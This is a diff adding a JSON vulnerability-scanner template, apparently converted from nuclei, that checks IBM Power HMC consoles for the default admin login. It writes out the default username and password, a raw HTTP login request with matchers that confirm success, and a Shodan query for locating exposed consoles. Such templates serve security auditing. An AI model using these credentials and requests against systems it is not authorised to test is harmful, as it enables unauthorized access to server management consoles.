@@ -1,0 +1,144 @@
+{
+  "id": "ibm-hmc-default-login",
+  "name": "IBM Power HMC - Default Login",
+  "author": "R3S OST",
+  "severity": "HIGH",
+  "description": "IBM HMC default admin login credentials were discovered.\n",
+  "references": [
+    "https://www.ibm.com/docs/en/power8?topic\u003dtools-hardware-management-console"
+  ],
+  "tags": [
+    "default-login",
+    "ibm",
+    "hmc"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.favicon.hash:262502857"
+  },
+  "variables": {
+    "password": [
+      "abc123"
+    ],
+    "username": [
+      "hscroot"
+    ]
+  },
+  "variablesType": "pitchfork",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /hmc/j_security_check HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nj_username\u003d{{username}}\u0026j_password\u003d{{password}}\u0026j_newConsole\u003dDashboard\u0026j_security_check\u003dLog+in\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "len(body) \u003d\u003d 0",
+            "status_code \u003d\u003d 303",
+            "contains(header, \u0027Location: /hmc/connect;jsessionid\u003d\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ibm-hmc-default-login",
+    "info": {
+      "name": "IBM Power HMC - Default Login",
+      "author": "R3S OST",
+      "severity": "high",
+      "description": "IBM HMC default admin login credentials were discovered.\n",
+      "reference": [
+        "https://www.ibm.com/docs/en/power8?topic\u003dtools-hardware-management-console"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "http.favicon.hash:262502857"
+      },
+      "tags": "default-login,ibm,hmc"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "username": [
+            "hscroot"
+          ],
+          "password": [
+            "abc123"
+          ]
+        },
+        "attack": "pitchfork",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /hmc/j_security_check HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nj_username\u003d{{username}}\u0026j_password\u003d{{password}}\u0026j_newConsole\u003dDashboard\u0026j_security_check\u003dLog+in\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "len(body) \u003d\u003d 0",
+              "status_code \u003d\u003d 303",
+              "contains(header, \u0027Location: /hmc/connect;jsessionid\u003d\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
